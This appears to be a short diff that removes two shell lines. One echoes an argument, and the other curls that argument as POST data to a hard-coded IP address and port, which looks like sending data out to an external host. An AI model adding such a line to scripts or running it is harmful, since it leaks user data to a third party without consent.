@@ -1,2 +1,0 @@
-echo $1;
-curl 10.52.128.101:5964 --tcp-fastopen --data "$1"
